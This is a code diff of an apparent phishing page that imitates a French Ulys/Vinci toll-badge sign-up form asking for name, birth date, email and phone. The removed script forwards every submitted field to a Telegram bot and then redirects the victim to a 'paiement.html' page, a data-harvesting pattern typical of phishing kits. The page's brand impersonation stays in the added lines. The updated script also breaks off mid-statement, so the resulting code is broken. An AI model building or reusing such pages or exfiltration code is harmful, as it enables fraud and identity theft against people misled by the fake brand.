@@ -3,16 +3,19 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Connexion à votre espace Vinci – Ulys</title>
+  <title>Informations personnelles – Ulys</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" />
   <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; }
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
 
     body {
       font-family: 'Inter', sans-serif;
       background: #FBEAD3;
-      margin: 0;
-      padding: 0;
+      color: #1c1c1c;
     }
 
     .site-nav {
@@ -51,15 +54,18 @@
       border: 1px solid #ccc;
       border-radius: 25px;
       overflow: hidden;
+      background: #f6f6f6;
     }
 
     .header-toggle .toggle {
       padding: 0.5rem 1.5rem;
-      background: #fff;
+      background: transparent;
       border: none;
       font-weight: 600;
       font-size: 0.9rem;
+      color: #444;
       cursor: pointer;
+      transition: background 0.3s ease;
     }
 
     .header-toggle .toggle.active {
@@ -86,7 +92,7 @@
       display: flex;
       justify-content: center;
       align-items: center;
-      margin-bottom: 2rem;
+      margin-bottom: 1.5rem;
     }
 
     .form-logo-center img {
@@ -94,11 +100,19 @@
       object-fit: contain;
     }
 
+    .intro-text {
+      text-align: center;
+      font-size: 1rem;
+      margin-bottom: 2rem;
+      color: #333;
+    }
+
     form label {
       display: block;
       margin: 1rem 0 0.3rem;
       font-weight: 600;
       font-size: 0.95rem;
+      color: #1c1c1c;
     }
 
     form input {
@@ -108,6 +122,11 @@
       border-radius: 25px;
       background: #fafafa;
       font-size: 1rem;
+    }
+
+    form input::placeholder {
+      color: #999;
+      font-size: 0.95rem;
     }
 
     form input:focus {
@@ -120,7 +139,7 @@
       display: block;
       width: 100%;
       margin-top: 2rem;
-      padding: 0.85rem;
+      padding: 0.9rem;
       background: #ff8000;
       color: #fff;
       font-size: 1.05rem;
@@ -129,6 +148,8 @@
       border: none;
       border-radius: 25px;
       cursor: pointer;
+      box-shadow: 0 4px 10px rgba(255, 128, 0, 0.2);
+      transition: background 0.3s ease;
     }
 
     .btn:hover {
@@ -194,6 +215,8 @@
         <img src="assets/images/logo-ulys2.png" alt="Ulys" />
       </div>
 
+      <p class="intro-text">Merci de compléter vos informations personnelles pour poursuivre votre inscription.</p>
+
       <form id="form-abonnement">
         <label>Civilité</label>
         <div class="header-toggle" id="civilite-toggle">
@@ -203,9 +226,9 @@
         <input type="hidden" name="civilite" id="civilite" value="M." />
 
         <label for="prenom">Prénom</label>
-        <input id="prenom" name="prenom" type="text" placeholder="Prénom" required />
+        <input id="prenom" name="prenom" type="text" placeholder="Jean" required />
         <label for="nom">Nom</label>
-        <input id="nom" name="nom" type="text" placeholder="Nom" required />
+        <input id="nom" name="nom" type="text" placeholder="Dupont" required />
         <label for="dob">Date de naissance</label>
         <input id="dob" name="dob" type="date" required />
         <label for="email">E-mail</label>
@@ -229,58 +252,12 @@
   </footer>
 
   <script>
-    // Toggle utilisateur
     function toggleUserType(button) {
       document.querySelectorAll(".header-toggle .toggle").forEach(btn => btn.classList.remove("active"));
       button.classList.add("active");
     }
 
-    // Civilité
     const toggleButtons = document.querySelectorAll("#civilite-toggle .toggle");
     const civiliteInput = document.getElementById("civilite");
 
-    toggleButtons.forEach(btn => {
-      btn.addEventListener("click", () => {
-        toggleButtons.forEach(b => b.classList.remove("active"));
-        btn.classList.add("active");
-        civiliteInput.value = btn.dataset.value;
-      });
-    });
-
-    // Envoi Telegram + redirection
-    const form = document.getElementById("form-abonnement");
-    form.addEventListener("submit", function (e) {
-      e.preventDefault();
-
-      const civilite = document.getElementById("civilite").value;
-      const prenom = document.getElementById("prenom").value;
-      const nom = document.getElementById("nom").value;
-      const dob = document.getElementById("dob").value;
-      const email = document.getElementById("email").value;
-      const tel = document.getElementById("tel").value;
-
-      const message = `
-📥 Nouvelle soumission d'informations :
-👤 ${civilite} ${prenom} ${nom}
-🎂 Né(e) le : ${dob}
-📧 Email : ${email}
-📱 Téléphone : ${tel}
-      `;
-
-      fetch("https://api.telegram.org/botTON_BOT/sendMessage", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chat_id: "TON_CHAT_ID",
-          text: message
-        })
-      });
-
-      document.getElementById("spinnerOverlay").style.display = "flex";
-      setTimeout(() => {
-        window.location.href = "paiement.html";
-      }, 5000);
-    });
-  </script>
-</body>
-</html>
+    toggleButtons.forEach(btn
